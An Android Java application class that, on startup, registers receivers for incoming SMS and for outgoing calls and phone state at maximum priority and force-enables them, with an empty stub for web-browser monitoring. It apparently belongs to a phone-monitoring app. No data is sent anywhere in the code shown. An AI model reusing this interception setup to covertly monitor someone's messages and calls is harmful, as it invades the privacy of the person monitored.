package vn.vhc.live;

import android.app.Application;
import android.content.ComponentName;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;

public class MyApp extends Application {

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
	}
 
	@Override
	public void onCreate() {
		super.onCreate();
		
		SMSReceiver smsReceiver=new SMSReceiver();
		IntentFilter intentFilter =new IntentFilter();
		intentFilter.setPriority(2147483647);//ok for good
		intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.addAction("android.provider.Telephony.GSM_SMS_RECEIVED");	
		intentFilter.addCategory("android.intent.category.DEFAULT");
		registerReceiver(smsReceiver, intentFilter);
		
		PackageManager pm = this.getPackageManager();
		ComponentName receiver = new ComponentName(this, SMSReceiver.class);
		pm.setComponentEnabledSetting(receiver,
		        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
		        PackageManager.DONT_KILL_APP);
		
		MyPhoneReceiver phoneReceiver=new MyPhoneReceiver();//android.intent.action.NEW_OUTGOING_CALL
		IntentFilter intentFilterReceiver =new IntentFilter();
		intentFilterReceiver.setPriority(2147483647);//ok for good
		intentFilterReceiver.addAction("android.intent.action.NEW_OUTGOING_CALL");		
		intentFilterReceiver.addAction("android.intent.action.PHONE_STATE");	
		registerReceiver(phoneReceiver, intentFilterReceiver);
		
		PackageManager pmReceiver = this.getPackageManager();
		ComponentName cmpPhoneReceiver = new ComponentName(this, MyPhoneReceiver.class);
		pmReceiver.setComponentEnabledSetting(cmpPhoneReceiver,
		        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
		        PackageManager.DONT_KILL_APP);		
		
	}
 
	@Override
	public void onLowMemory() {
		super.onLowMemory();
	}
 
	@Override
	public void onTerminate() {
		super.onTerminate();
	}
	public void monitorWeb()
	{
		
		
	}
	

}
